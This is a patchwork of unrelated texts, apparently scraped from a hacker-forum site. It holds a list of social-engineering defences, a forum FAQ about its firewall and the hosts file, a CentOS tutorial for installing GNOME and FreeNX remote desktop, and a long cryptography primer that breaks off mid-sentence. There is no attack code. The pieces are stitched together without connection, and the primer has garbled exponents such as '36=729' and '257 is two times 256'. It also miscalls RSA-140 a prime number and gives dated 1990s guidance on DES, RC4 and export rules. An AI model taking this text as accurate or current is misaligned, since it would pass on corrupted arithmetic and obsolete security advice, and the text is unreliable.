viewing, editing  and sharing of the data. It helps to deter social engineering by  providing employees a mechanism for understanding what information  can be disclosed and what cannot be shared without proper  authorization.  [/TD]   [/TR]      [TR]   [TD] [/TD]   [/TR]      [TR]   [TD]Some of the other controls that should be taken  care of, to reduce the success of a Social Engineering attack are listed  below:[/TD]   [/TR]      [TR]   [TD]  Install and maintain firewalls, anti-virus, anti-spyware  softwares, and email filters. Never allow people to tailgate with you. There should be a proper Incident response strategy set  for the organization. Usage of corporate IDs on public domain, blogs,  discussion forums etc should be restricted. Pay attention to the URL of a web site. Though malicious  web sites generally look identical to a legitimate site, but the URL  may use a variation in spelling or a different domain. Confidential and critical online details like corporate  mail box should not be accessed in public places, cafes, and hotels  etc. where Internet security cannot be trusted. Dont send sensitive information over the Internet before  checking a web sites security. Dont reveal personal or financial information in email,  and do not respond to email solicitations requesting this  information. Ensure all physical entry and exit points are secured at  all times. Do not provide personal information or information about  your organization to anyone unless you are certain of the persons  authority to have that information. Use virtual keyboard where applicable. Be very careful what is provided on your company web site.  Avoid posting organizational charts or lists of key people wherever  possible. Make sure to shred any document that is discarded that may  contain sensitive data.

Below  we will try to answer as many questions about this as  possible.  Please  read them thoroughly before contacting staff.  How does the server firewall work?  One of the best defenses any site has is its server level firewall.   Currently we have it set for a certain amount of connections to add you   to the block list automatically, thus effectively cutting you off to  the  server itself. You can trigger this firewall in a number of ways.   One  is by opening too many tabs in your browser. The other is by  refreshing a  page too often. To prevent being firewalled youll need to  change your  habits when using IHF. Another option is to change the  settings of your  browser.  Firefox: In the address bar, type: about:config In the filter type: connect Alter the \""network.http.max-connections-per-server\"" to 10 Opera: In the address bar, type: about:config In the quick search type: connect Alter \""Max Connections Server\"" to 10 If problems still occur lower the number again to 8. Neither setting   should really give you a noticeable slowdown to the web.  Most servers   automatically throttle you anyways, but IHF will go one step further and   firewall you.  How do I get unblocked?  If by chance you get blocked, you should connect from a proxy, and use   the contact form. Select \""Firewalled\"", and enter your regular IP along   with your username.  It will be reviewed within 24 hours.  The firewall   is flushed periodically.  I heard IHF blocks entire countries. Is that true?  Yes this is true. Indianhacker.iN has many countries blocked.  The list   is extensive.Please note that country blocks are not a slur on the   people of that country. These blocks represent problems with IPs   originating from these countries. Many are part of botnets, rogue   datacenters, and high crime locations. Country blocks are one effective   way to eliminate \""bad traffic\"". So dont take it personal. Do not ask   for countries to be removed.  The block list is currently not published.   Can you whitelist me?  We do not whitelist individual member IPs under any circumstance.  Check Your Hosts File  A crypter was released by another hacker forum that went in and changed   your hosts file of Windows to prevent you from accessing IHF.    Effectively this will point your computer to nowhere when you want to   visit our site.  We deem this practice as unethical but we do not have   the power to stop it.  You can check if your hosts file was altered by   opening up in your browser this file: file://localhost/c:/windows/system32/drivers/etc/hosts If indeed you see entries for Indianhacker.iN please edit the file, and restart your browser. Im using a VPN but its not working.  We have a lot of VPNs, datacenters, and proxies blocked. Basically you   have no guarantee of connection to the site unless youre on a home   connection in an English speaking country.  SQL Errors  If while browsing youve come across a vBulletin error page citing a  MySQL  error please dont be immediately alarmed. Our website is very  busy and  while we try to minimize server problems and loading errors  they do  happen occasionally anyways. If you have hit an error we ask  that you  wait 1-2 minutes and refresh.

Hidden Content:  You must reply to see links   today im going to be using  CENT OS   6 32bit ,  as it is a very good and solid Linux distro [/HR]what i am advising is your specs should be: minimum guaranteed ram of 512 mb and burstable ram of more than 700 mb but saying that im using 128mb ram at the moment with burst at 500mb and  its working like a charm. but for best performance use specs above [/HR]  Download an install  putty   . This is a utility which you will use to send remote commands to your  vps for installing remote desktop. When you will run putty , it will  open a window like the image below, where you enter the ip address of  your vps and click on open. Hidden Content:  You must reply to see links [/HR]  [/HR]  In the next window login as root and supply your root password. This  will log you as root into your vps.(you might need to configure your  root password from withing you host control panel.) [/HR]  [/HR]  The next steps assume that your  centos  comes with  YUM  already installed. You may check if it is installed or not by issuing the following command in ur putty window.  Code: yum   If the output is something like the image below , then it is ok  otherwise contact your hosting provider to install yum for you. They can  do it in two seconds and they should have included to start with. [/HR]  [/HR]  Now we are using the command to install genome desktop enviroment which will install a graphical interface on your vps. copy this and right click in putty and it will paste the info in for you.  Code: yum groupinstall GNOME Desktop Environment X Window System   this process can take some time, depending on the speed of your vps give it 15minutes and hopefully it should be complete. once it does complete do the following  Code: yum update   this will update the system  Now we will install NX/FreeNX server in our vps, this basically controls our remote desktop connection  Code: yum install nx freenx   once this has installed run this command to update everything again  Code: yum update   ok so now we have downloaded and installed everything we need to reboot  the machine just to get everything running nice and fresh.  Code: shutdown -r now   give the vps time to load back up You will have to close the putty window and again start putty and connect to your server as you did above.  ok now we need to configure the server properly for the remote desktop connection open the folder location.  Code: cd /etc/nxserver   now lets view what files are here  Code: ls   this is what you should see  Code: client.id_dsa.key  node.conf.sample  server.id_dsa.pub.key CR                 passwords         users.id_dsa node.conf          passwords.orig    users.id_dsa.pub   the file you want to edit it the node.conf so we can do this many ways but the way i do it is  vi  Code: vi node.conf   this will display lots of information about the node.conf file you want to scroll down(using the down arrow key or pagedown onyour keyboard) through this till you find something saying  Code: ENABLE_PASSDB_AUTHENTICATION=\""0\""   you then want to edit this and change it to the following  Code: ENABLE_PASSDB_AUTHENTICATION=\""1\""   to change it to this what would would do at the start of the line where it has the hash # press c on you keyboard and then use the arrow keys on your keyboard to  scroll to where it says 0 change it to a 1 and then press ctrl + c  then type (this should save the file and quit)  Code: :wq   if this does not quit the file edit type(this will deffo exit the file)  Code: :q   now we need to add a user and password for the remote desktop. type this  Code: nxserver --adduser (the username here)   you should have something like this   Code: NX> 100 NXSERVER - Version 1.5.0-60 OS (GPL)  NX> 1000 NXNODE - Version 1.5.0-60 OS (GPL)  NX> 716 Public key added to: /home/your username here/.ssh/authorized_keys2  NX> 1001 Bye.  NX> 999 Bye   ok now that we have added the user we need to add a password to give it abit of security. first we load the user up  Code: nxserver --passwd (username here)   then we change the password  Code: NX> 100 NXSERVER - Version 1.5.0-60 OS (GPL)  New password: (password here) Password changed. NX> 999 Bye   and that should be your password setup for the remote desktop. now all we have to do is setup the program to connect to our remote vps, so we need to download  nomachine  which is what we have configured and setup during this tutorial. to get nomachine for windows  Hidden Content:  You must reply to see links [/HR]  [/HR]for any other os  Hidden Content:  You must reply to see links remember to download the client. not the server! once downloaded, run it and it will show you several bits of information [/HR]  [/HR]  you want to type in a session this will be anything you want to call this connection. then what you then want to do is type in your server ip, (your ip which  you have been using throughout putty this whole time) and keep the port  as 22 it will autochange and configure once logged in. also you want to set your current internet speed ^^ im adsl, so i selected adsl. once you have configured that follow through till you get this. [/HR]  [/HR]  open up nxmachine and it will produce a log in screen click configure you want to have the desktop set to gnome,  and then you want to  enter your key! [/HR]  [/HR]  to find out what your key is open putty back up and type or copy this  Code: cat /var/lib/nxserver/home/.ssh/client.id_dsa.key   this will display your key what you want to do is highlight it all and press ctrl + c ^^ very important!!!!!! once you have copyed your key go back to nomachine and click key, you  want to delete everything in here and paste your key into here and save  it. once you have saved your key close the window and click ok. log in with the details which you setup up earlier where we created the username and password, and you should be able to log in. now, if your centos starts to display everything with [][][][][][][][][]  rather than text it means that the fonts havnt been installed which is  quite a common issue,  go back to putty type this in   Code: yum install xorg-x11-fonts-Type1   this will install the fonts for this remote desktop session. the remote desktop should refresh itself in a few moments and the font should look normal again. you have reached the end of this tutorial. thanks for reading please give thanks if this helped at all, and if there is any spelling  mistakes or errors please inform me, trying to type with one hand and  hold baby in other isnt easy.   """

Or does  security provide some very basic protections that we are naive to  believe that we dont need? During this time when the Internet provides  essential communication between tens of millions of people and is being  increasingly used as a tool for commerce, security becomes a  tremendously important issue to deal with.  There are many aspects to security and many applications, ranging from  secure commerce and payments to private communications and protecting  passwords. One essential aspect for secure communications is that of  cryptography, which is the focus of this chapter. But it is important to  note that while cryptography is necessary for secure communications, it  is not by itself sufficient. The reader is advised, then, that the  topics covered in this chapter only describe the first of many steps  necessary for better security in any number of situations.  This paper has two major purposes. The first is to define some of the  terms and concepts behind basic cryptographic methods, and to offer a  way to compare the myriad cryptographic schemes in use today. The second  is to provide some real examples of cryptography in use today.  I would like to say at the outset that this paper is very focused on  terms, concepts, and schemes in current use and is not a treatise of the  whole field. No mention is made here about pre-computerized crypto  schemes, the difference between a substitution and transposition cipher,  cryptanalysis, or other history. Interested readers should check out  some of the books in the bibliography below for this detailed � and  interesting! � background information. 2. THE PURPOSE OF CRYPTOGRAPHY Cryptography is the science of writing in secret code and is an ancient  art; the first documented use of cryptography in writing dates back to  circa 1900 B.C. when an Egyptian scribe used non-standard hieroglyphs in  an inscription. Some experts argue that cryptography appeared  spontaneously sometime after writing was invented, with applications  ranging from diplomatic missives to war-time battle plans. It is no  surprise, then, that new forms of cryptography came soon after the  widespread development of computer communications. In data and  telecommunications, cryptography is necessary when communicating over  any untrusted medium, which includes just about any network,  particularly the Internet.  Within the context of any application-to-application communication, there are some specific security requirements, including:  Authentication: The process of proving ones identity. (The primary  forms of host-to-host authentication on the Internet today are  name-based or address-based, both of which are notoriously weak.)  Privacy/confidentiality: Ensuring that no one can read the message except the intended receiver.  Integrity: Assuring the receiver that the received message has not been altered in any way from the original.  Non-repudiation: A mechanism to prove that the sender really sent this message.  Cryptography, then, not only protects data from theft or alteration, but  can also be used for user authentication. There are, in general, three  types of cryptographic schemes typically used to accomplish these goals:  secret key (or symmetric) cryptography, public-key (or asymmetric)  cryptography, and hash functions, each of which is described below. In  all cases, the initial unencrypted data is referred to as plaintext. It  is encrypted into ciphertext, which will in turn (usually) be decrypted  into usable plaintext.  In many of the descriptions below, two communicating parties will be  referred to as Alice and Bob; this is the common nomenclature in the  crypto field and literature. If there is a third or fourth party to the  communication, they will be referred to as Carol and Dave. Mallory is a  malicious party and Eve is an eavesdropper. 3. TYPES OF CRYPTOGRAPHIC ALGORITHMS There are several ways of classifying cryptographic algorithms. For  purposes of this paper, they will be categorized based on the number of  keys that are employed for encryption and decryption, and further  defined by their application and use. The three types of algorithms that  will be discussed are (Figure 1):  Secret Key Cryptography: Uses a single key for both encryption and decryption  Public Key Cryptography: Uses one key for encryption and another for decryption  Hash Functions: Uses a mathematical transformation to irreversibly \""encrypt\"" information  FIGURE 1: Three types of cryptography: secret-key, public key, and hash function.  3.1. Secret Key Cryptography In secret key cryptography, a single key is used for both encryption and  decryption. As shown in Figure 1A, the sender uses the key (or some set  of rules) to encrypt the plaintext and sends the ciphertext to the  receiver. The receiver applies the same key (or ruleset) to decrypt the  message and recover the plaintext. Because a single key is used for both  functions, secret key cryptography is also called symmetric encryption. With this form of cryptography, it is obvious that the key must be known  to both the sender and the receiver; that, in fact, is the secret. The  biggest difficulty with this approach, of course, is the distribution of  the key. There are several widely used secret key cryptography schemes and they  are generally categorized as being either stream ciphers or block  ciphers. Stream ciphers operate on a single bit, byte, or (computer)  word at a time, and implement some form of feedback mechanism so that  the key is constantly changing. A block cipher is so-called because the  scheme encrypts one block of data at a time using the same key on each  block. In general, the same plaintext block will always encrypt to the  same ciphertext when using the same key in a block cipher whereas the  same plaintext will always encrypt to different ciphertext in a stream  cipher. Stream ciphers come in several flavors but two are worth mentioning  here. Self-synchronizing stream ciphers calculate each bit in the  keystream as a function of the previous n bits in the keystream. It is  termed \""self-synchronizing\"" because the decryption process can stay  synchronized with the encryption process merely by knowing how far into  the n-bit keystream it is. One problem is error propagation; a garbled  bit in transmission will result in n garbled bits at the receiving side.  Synchronous stream ciphers generate the keystream in a fashion  independent of the message stream but by using the same keystream  generation function at sender and receiver. While stream ciphers do not  propagate transmission errors, they are, by their nature, periodic so  that the keystream will eventually repeat. Block ciphers can operate in one of several modes; the following four are the most important: Electronic Codebook (ECB) mode is the simplest, most obvious  application: the secret key is used to encrypt the plaintext block to  form a ciphertext block. Two identical plaintext blocks, then, will  always generate the same ciphertext block. Although this is the most  common mode of block ciphers, it is susceptible to a variety of  brute-force attacks.  Cipher Block Chaining (CBC) mode adds a feedback mechanism to the  encryption scheme. In CBC, the plaintext is exclusively-ORed (XORed)  with the previous ciphertext block prior to encryption. In this mode,  two identical blocks of plaintext never encrypt to the same ciphertext.  Cipher Feedback (CFB) mode is a block cipher implementation as a  self-synchronizing stream cipher. CFB mode allows data to be encrypted  in units smaller than the block size, which might be useful in some  applications such as encrypting interactive terminal input. If we were  using 1-byte CFB mode, for example, each incoming character is placed  into a shift register the same size as the block, encrypted, and the  block transmitted. At the receiving side, the ciphertext is decrypted  and the extra bits in the block (i.e., everything above and beyond the  one byte) are discarded.  Output Feedback (OFB) mode is a block cipher implementation conceptually  similar to a synchronous stream cipher. OFB prevents the same plaintext  block from generating the same ciphertext block by using an internal  feedback mechanism that is independent of both the plaintext and  ciphertext bitstreams.  The most common secret-key cryptography scheme used today is the Data  Encryption Standard (DES), designed by IBM in the 1970s and adopted by  the National Bureau of Standards (NBS) [now the National Institute for  Standards and Technology (NIST)] in 1977 for commercial and unclassified  government applications. DES has been adopted as Federal Information  Processing Standard 46 (FIPS 46-2) and by the American National  Standards Institute as X3.92). DES is a block-cipher employing a 56-bit  key that operates on 64-bit blocks. DES has a complex set of rules and  transformations that were designed specifically to yield fast hardware  implementations and slow software implementations, although this latter  point is becoming less significant today since the speed of computer  processors is several orders of magnitude faster today than twenty years  ago. IBM also proposed a 112-bit key for DES, which was rejected at the  time by the government; the use of 112-bit keys was considered in the  1990s, however, conversion was never seriously considered. Several variants of DES are currently in use, including Triple-DES  (3DES, draft FIPS 46-3) and DESX. A detailed discussion of DES, breaking  DES, and DES variants can be found in Section 5.4 below. There are a number of other secret-key cryptography algorithms that are also in use today: CAST-128 (described in Request for Comments, or RFC, 2144; CAST is not  an acronym but its name is derived from the initials of its inventors,  Carlisle Adams and Stafford Tavares of Nortel), a DES-like  substitution-permutation crypto algorithm, employing a 128-bit key  operating on a 64-bit block. CAST-256 (RFC 2612) is an extension of  CAST-128, using a 128-bit block size and a variable length (128, 160,  192, 224, or 256 bit) key. CAST is internationally available.  International Data Encryption Algorithm (IDEA), another DES-like 64-bit  block cipher using 128-bit keys. Also internationally available.  Rivest Cipher 2 (RC2), named for its inventor Ron Rivest (thus, \""RC\"" is  also sometimes expanded as \""Rons Code\""), a 64-bit block cipher using  variable-sized keys designed to replace DES. Its code has not been made  public although many companies have licensed RC2 for use in their  products. [NOTE: RC1 was designed on paper but never implemented. RC3  was found to be breakable during development.]  RC4, a stream cipher using variable-sized keys; it is widely used in  commercial cryptography products, although it can only be exported using  keys that are 40 bits or less in length.  RC5, a block-cipher supporting a variety of block sizes, key sizes, and number of encryption passes over the data.  Blowfish, a symmetric 64-bit block cipher invented by Bruce Schneier;  optimized for 32-bit processors with large data caches, it is  significantly faster than DES on a Pentium/PowerPC-class machine. Key  lengths can vary from 32 to 448 bits in length. Blowfish is available  for free for all users and is in use in over 80 products.  Twofish, a 128-bit block cipher using 128-, 192-, or 256-bit keys.  Designed to be highly secure and highly flexible, well-suited for large  microprocessors, 8-bit smart card microprocessors, and dedicated  hardware. Designed by a team led by Bruce Schneier.  In 1997, NIST initiated a process to develop a new secure cryptosystem  for U.S. government applications. The result, the Advanced Encryption  Standard (AES), became the official successor to DES in December 2001.  The AES process and new algorithm, based upon a SKC scheme called  Rijndael and employing a 128-, 192-, or 256-bit key, is described in  more detail in Section 5.9 below. 3.2. Public-Key Cryptography Public-key cryptography (PKC) has been said to be the most significant  new development in cryptography in the last 300-400 years. Modern PKC  was first described publicly by Stanford University professor Martin  Hellman and graduate student Whitfield Diffie in 1976. Their paper  described a two-key crypto system in which two parties could engage in a  secure communication over a non-secure communications channel without  having to share a secret key. The mathematical \""trick\"" in PKC depends upon the existence of so-called  one-way functions, or mathematical functions that are easy to calculate  whereas their inverse function is relatively difficult to calculate. Let  me give you two trivial examples: Multiplication vs. factorization: Suppose I tell you that I have two  numbers, 9 and 16, and that I want to calculate the product. It should  take almost no time to come up with 144 as that product. Suppose instead  that I tell you that I am thinking of a number, 144, and I need you  tell me which pair of integer factors I used to derive that number. You  will eventually come up with the solution but whereas calculating the  product took milliseconds, factoring will take longer because you first  need to find the 8 pair of integer factors and then determine which one  is the correct pair.  Exponentiation vs. logarithms: Suppose I tell you that I want to take  the number 3 to the 6th power; again, it is easy to calculate 36=729.  But if I tell you that I have the number 729 and want you to tell me the  two integers that I used, x and y so that logx y = 729, it will take  you longer to find all possible solutions and select the pair that I  used.  Again, the examples above were trivial but they do represent two of the  functional pairs that are used with PKC; namely, the ease of  multiplication and exponentiation versus the relative difficulty of  factoring and calculating logarithms, respectively. Generic PKC employs  two keys that are mathematically related although knowledge of one key  does not allow someone to easily determine the other key. One key is  used to encrypt the plaintext and the other key is used to decrypt the  ciphertext. The important point here is that it does not matter which  key is applied first, but that both keys are required for the process to  work (Figure 1B). Because a pair of keys are required, this approach is  also called asymmetric cryptography. In PKC, one of the keys is designated the public key and may be  advertised as widely as the owner wants. The other key is designated the  private key and is never revealed to another party. It is straight  forward to send messages under this scheme. Suppose Alice wants to send  Bob a message. Alice encrypts some information using Bobs public key;  Bob decrypts the ciphertext using his private key. This method could be  also used to prove who sent a message; Alice, for example, could encrypt  some plaintext with her private key; when Bob decrypts using Alices  public key, he knows that Alice sent the message and Alice cannot deny  having sent the message (non-repudiation). The first, and still most common, PKC implementation is RSA, named for  the three MIT mathematicians who developed it � Ronald Rivest, Adi  Shamir, and Leonard Adleman. RSA today is used in hundreds of software  products and can be used for key exchange, digital signatures, or  encryption of small blocks of data. RSA uses a variable size encryption  block and a variable size key. The key-pair is derived from a very large  number, n, that is the product of two prime numbers chosen according to  special rules; these primes may be 100 or more digits in length each,  yielding an n with roughly twice as many digits as the prime factors.  The public key information includes n and a derivative of one of the  factors of n; an attacker cannot determine the prime factors of n (and,  therefore, the private key) from this information alone and that is what  makes the RSA algorithm so secure. (Some descriptions of PKC  erroneously state that RSAs safety is due to the difficulty in  factoring large prime numbers. In fact, large prime numbers, like small  prime numbers, only have two factors!) The ability for computers to  factor large numbers, and therefore attack schemes such as RSA, is  rapidly improving and systems today can find the prime factors of  numbers with more than 140 digits. The presumed protection of RSA,  however, is that users can easily increase the key size to always stay  ahead of the computer processing curve. As an aside, the patent for RSA  expired in September 2000 which does not appear to have affected RSAs  popularity one way or the other. An alternative to RSA is the Diffie-Hellman scheme which is used only  for key exchange. It is frequently used in conjunction with NISTs  Digital Signature Standard (DSS). Another alternative that is  particularly attractive to devices with limited compute power and/or  memory is Elliptic Curve Cryptography (ECC). A detailed example of the Diffie-Hellman algorithm can be found in  Section 5.2 below and RSA is discussed in Section 5.3. ECC is presented  in Section 5.8. A digression: Who invented PKC? I tried to be careful in the first  paragraph of this section to state that Diffie and Hellman \""first  described publicly\"" a PKC scheme. Although I have categorized PKC as a  two-key system, that has been merely for convenience; the real criteria  for a PKC scheme is that it allows two parties to exchange a secret even  though the communication with the shared secret might be overheard.  There seems to be no question that Diffie and Hellman were first to  publish; their method is described in the classic paper, \""New Directions  in Cryptography,\"" published in the November 1976 issue of IEEE  Transactions on Information Theory. As shown below, Diffie-Hellman uses  the idea that finding logarithms is relatively harder than  exponentiation. And, indeed, it is the precursor to modern PKC which  does employ two keys. Rivest, Shamir, and Adleman described an  implementation that extended this idea in their paper \""A Method for  Obtaining Digital Signatures and Public-Key Cryptosystems,\"" published in  the February 1978 issue of the Communications of the ACM (CACM). Their  method, of course, is based upon the relative ease of finding the  product of two large prime numbers compared to finding the prime factors  of a large number. Some sources, though, credit Ralph Merkle with first describing a system  that allows two parties to share a secret although it was not a two-key  system, per se. A Merkle Puzzle works where Alice creates a large  number of encrypted keys, sends them all to Bob so that Bob chooses one  at random and then lets Alice know which he has selected. An  eavesdropper will see all of the keys but cant learn which key Bob has  selected (because he has encrypted the response with the chosen key). In  this case, Eves effort to break in is the square of the effort of Bob  to choose a key. While this difference may be small it is often  sufficient. Merkle apparently took a computer science course at UC  Berkeley in 1974 and described his method, but had difficulty making  people understand it; frustrated, he dropped the course. Meanwhile, he  submitted the paper \""Secure Communication Over Insecure Channels\"" which  was published in the CACM in April 1978; Rivest et al.s paper even  makes reference to it. Merkles method certainly wasnt published first,  but did he have the idea first? An interesting question, maybe, but who really knows? For some time, it  was a quiet secret that a team at the UKs Government Communications  Headquarters (GCHQ) had first developed PKC in the early 1970s. Because  of the nature of the work, GCHQ kept the original memos classified. In  1997, however, the GCHQ changed their posture when they realized that  there was nothing to gain by continued silence. Documents show that a  GCHQ mathematician named James Ellis started research into the key  distribution problem in 1969 and that by 1975, Ellis, Clifford Cocks,  and Malcolm Williamson had worked out all of the fundamental details of  PKC, yet couldnt talk about their work. (They were, of course, barred  from challenging the RSA patent!) After more than 20 years, Ellis,  Cocks, and Williamson have begun to get their due credit. And the National Security Agency (NSA) claims to have knowledge of this  type of algorithm as early as 1966 but there is no supporting  documentation... yet. So this really was a digression... 3.3. Hash Functions Hash functions, also called message digests and one-way encryption, are  algorithms that, in some sense, use no key (Figure 1C). Instead, a  fixed-length hash value is computed based upon the plaintext that makes  it impossible for either the contents or length of the plaintext to be  recovered. Furthermore, there is an almost zero probability that two  different plaintext messages will yield the same hash value.  Hash algorithms are typically used to provide a digital fingerprint of a  files contents, often used to ensure that the file has not been  altered by an intruder or virus. Hash functions are also commonly  employed by many operating systems to encrypt passwords.  Among the most common hash functions in use today in commercial  cryptographic applications are a family of Message Digest (MD)  algorithms, all of which are byte-oriented schemes that produce a  128-bit hash value from an arbitrary-length message. MD2 (RFC 1319) is  well-suited for systems with limited memory, such as smart cards. MD4  (RFC 1320), developed by Rivest, is similar to MD2 but designed  specifically for fast processing in software. MD5 (RFC 1321), also  developed by Rivest, came about after potential weaknesses were reported  in MD4; this scheme is similar to MD4 but is slower because more  manipulation is made to the original data. MD5 has been implemented in a  large number of products although several weaknesses in the algorithm  were demonstrated by German cryptographer Hans Dobbertin in 1996.  The Secure Hash Algorithm (SHA), proposed by NIST for their Secure Hash  Standard (SHS), is seeing increased use in commercial products today.  SHA-1 produces a 160-bit hash value. 3.4. Why Three Encryption Techniques? So, why are there so many different types of cryptographic schemes? Why cant we do everything we need with just one?  The answer is that each scheme is optimized for some specific  application(s). Hash functions, for example, are well-suited for  ensuring data integrity because any change made to the contents of a  message will result in the receiver calculating a different hash value  than the one placed in the transmission by the sender. Since it is  highly unlikely that two different messages will yield the same hash  value, data integrity is ensured to a high degree of confidence.  Secret-key cryptography, on the other hand, is ideally suited to  encrypting messages. The sender can generate a session key on a  per-message basis to encrypt the message; the receiver, of course, needs  the same session key to decrypt the message.  Key exchange, of course, is a key application of public-key cryptography  (no pun intended). Asymmetric schemes can also be used for  non-repudiation; if the receiver can obtain the session key encrypted  with the senders private key, then only this sender could have sent the  message. Public-key cryptography could, theoretically, also be used to  encrypt messages although this is rarely done because secret-key  cryptography operates about 1000 times faster than public-key  cryptography.  FIGURE 2: Sample application of the three cryptographic techniques for secure communication.  Figure 2 puts all of this together and shows how a hybrid cryptographic  scheme combines all of these functions to form a secure transmission  comprising digital signature and digital envelope. In this example, the  sender of the message is Alice and the receiver is Bob.  A digital envelope comprises an encrypted message and an encrypted  session key. Alice uses secret key cryptography to encrypt her message  using the session key, which she generates at random with each session.  Alice then encrypts the session key using Bobs public key. The  encrypted message and encrypted session key together form the digital  envelope. Upon receipt, Bob recovers the session secret key using his  private key and then decrypts the encrypted message.  The digital signature is formed in two steps. First, Alice computes the  hash value of her message; next, she encrypts the hash value with her  private key. Upon receipt of the digital signature, Bob recovers the  hash value calculated by Alice by decrypting the digital signature with  Alices public key. Bob can then apply the hash function to Alices  original message, which he has already decrypted (see previous  paragraph). If the resultant hash value is not the same as the value  supplied by Alice, then Bob knows that the message has been altered; if  the hash values are the same, Bob should believe that the message he  received is identical to the one that Alice sent.  This scheme also provides nonrepudiation since it proves that Alice sent  the message; if the hash value recovered by Bob using Alices public  key proves that the message has not been altered, then only Alice could  have created the digital signature. Bob also has proof that he is the  intended receiver; if he can correctly decrypt the message, then he must  have correctly decrypted the session key meaning that his is the  correct private key. 3.5. The Significance of Key Length In a recent article in the industry literature (circa 9/98), a writer  made the claim that 56-bit keys do not provide as sufficient protection  for DES today as they did in 1975 because computers are 1000 times  faster today than in 1975. Therefore, the writer went on, we should be  using 56,000-bit keys today instead of 56-bit keys to provide adequate  protection. The conclusion was then drawn that because 56,000-bit keys  are infeasible (true), we should accept the fact that we have to live  with weak cryptography (false!). The major error here is that the writer  did not take into account that the number of possible key values double  whenever a single bit is added to the key length; thus, a 57-bit key  has twice as many values as a 56-bit key (because 257 is two times 256).  In fact, a 66-bit key would have 1024 times the possible values as a  56-bit key.  But this does bring up the issue, what is the precise significance of key length as it affects the level of protection?  In cryptography, size does matter. The larger the key, the harder it is  to crack a block of encrypted data. The reason that large keys offer  more protection is almost obvious; computers have made it easier to  attack ciphertext by using brute force methods rather than by attacking  the mathematics (which are generally well-known anyway). With a brute  force attack, the attacker merely generates every possible key and  applies it to the ciphertext. Any resulting plaintext that makes sense  offers a candidate for a legitimate key. This was the basis, of course,  of the EFFs attack on DES.  Until the mid-1990s or so, brute force attacks were beyond the  capabilities of computers that were within the budget of the attacker  community. Today, however, significant compute power is commonly  available and accessible. General purpose computers such as PCs are  already being used for brute force attacks. For serious attackers with  money to spend, such as some large companies or governments, Field  Programmable Gate Array (FPGA) or Application-Specific Integrated  Circuits (ASIC) technology offers the ability to build specialized chips  that can provide even faster and cheaper solutions than a PC. Consider  that an AT&T ORCA chip (FPGA) costs $200 and can test 30 million DES  keys per second, while a $10 ASIC chip can test 200 million DES keys  per second (compared to a PC which might be able to test 40,000 keys per  second).  The table below shows what DES key sizes are needed to protect data from  attackers with different time and financial resources. This information  is not merely academic; one of the basic tenets of any security system  is to have an idea of what you are protecting and from who are you  protecting it! The table clearly shows that a 40-bit key is essentially  worthless today against even the most unsophisticated attacker. On the  other hand, 56-bit keys are fairly strong unless you might be subject to  some pretty serious corporate or government espionage. But note that  even 56-bit keys are declining in their value and that the times in the  table (1995 data) are worst cases.  TABLE 1. Minimum Key Lengths for Symmetric Ciphers. Type of Attacker Budget Tool Time and Cost Per Key Recovered Key Length Needed For Protection In Late-1995  40 bits 56 bits  Pedestrian Hacker Tiny Scavanged computer time 1 week Infeasible 45  $400 FPGA 5 hours ($0.08) 38 years ($5,000) 50  Small Business $10,000 FPGA 12 minutes ($0.08) 18 months ($5,000) 55  Corporate Department $300K FPGA 24 seconds ($0.08) 19 days ($5,000) 60  ASIC 0.18 seconds ($0.001) 3 hours ($38)  Big Company $10M FPGA 7 seconds ($0.08) 13 hours ($5,000) 70  ASIC 0.005 seconds ($0.001) 6 minutes ($38)  Intelligence Agency $300M ASIC 0.0002 seconds ($0.001) 12 seconds ($38) 75  So, how big is big enough? DES, invented in 1975, is still in use today,  nearly 25 years later. If we take that to be a design criteria (i.e., a  20-plus year lifetime) and we believe Moores Law (\""computing power  doubles every 18 months\""), then a key size extension of 14 bits (i.e., a  factor of more than 16,000) should be adequate. The 1975 DES proposal  suggested 56-bit keys; by 1995, a 70-bit key would have been required to  offer equal protection and an 85-bit key will be necessary by 2015.  The discussion above suggests that a 128- or 256-bit key for SKC will  suffice for some time because that key length keeps us ahead of the  brute force capabilities of the attackers. While a large key is good, a  huge key may not always be better. That is, many public-key  cryptosystems use 1024- or 2048-bit keys; expanding the key to 4096 bits  probably doesnt add any protection at this time but it does add  significantly to processing time.  The most effective large-number factoring methods today use a  mathematical Number Field Sieve to find a certain number of  relationships and then uses a matrix operation to solve a linear  equation to produce the two prime factors. The sieve step actually  involves a large number of operations of operations that can be  performed in parallel; solving the linear equation, however, requires a  supercomputer. Indeed, finding the solution to the RSA-140 challenge in  February 1999 � factoring a 140-digit (465-bit) prime number � required  200 computers across the Internet about 4 weeks for the first step and a  Cray computer 100 hours and 810 MB of memory to do the second step.  In early 1999, Shamir (of RSA fame) described a new machine that could  increase factorization speed by 2-3 orders of magnitude. Although no  detailed plans were provided nor is one known to have been built, the  concepts of TWINKLE (The Weizmann Institute Key Locating Engine) could  result in a specialized piece of hardware that would cost about $5000  and have the processing power of 100-1000 PCs. There still appear to be  many engineering details that have to be worked out before such a  machine could be built. Furthermore, the hardware improves the sieve  step only; the matrix operation is not optimized at all by this design  and the complexity of this step grows rapidly with key length, both in  terms of processing time and memory requirements. Nevertheless, this  plan conceptually puts 512-bit keys within reach of being factored.  Although most PKC schemes allow keys that are 1024 bits and longer,  Shamir claims that 512-bit RSA keys \""protect 95% of todays E-commerce  on the Internet.\"" (See Bruce Schneiers Crypto-Gram (May 15, 1999) for  more information, as well as the comments from RSA Labs.)  It is also interesting to note that while cryptography is good and  strong cryptography is better, long keys may disrupt the nature of the  randomness of data files. Shamir and van Someren (\""Playing hide and seek  with stored keys\"") have noted that a new generation of viruses can be  written that will find files encrypted with long keys, making them  easier to find by intruders and, therefore, more prone to attack.  Finally, U.S. government policy has tightly controlled the export of  crypto products since World War II. Until recently, export outside of  North America of cryptographic products using keys greater than 40 bits  in length was prohibited, which made those products essentially  worthless in the marketplace, particularly for electronic commerce. More  recently, the U.S. Commerce Department relaxed the regulations,  allowing the general export of 56-bit SKC and 1024-bit PKC products  (certain sectors, such as health care and financial, allow the export of  products with even larger keys). The Commerce Departments Bureau of  Export Administration maintains a Commercial Encryption Export Controls  web page with more information. The potential impact of this policy on  U.S. businesses is well beyond the scope of this paper.  Much of the discussion in this section, including the table, are based  on the paper \""Minimal Key Lengths for Symmetric Ciphers to Provide  Adequate Commercial Security\"" by M. Blaze, W. Diffie, R.L. Rivest, B.  Schneier, T. Shimomura, E. Thompson, and M. Wiener.  4. TRUST MODELS Secure use of cryptography requires trust. While secret key cryptography  can ensure message confidentiality and hash codes can ensure integrity,  none of this works without trust. In SKC, Alice and Bob had to share a  secret key. PKC solved the secret distribution problem, but how does  Alice really know that Bob is who he says he 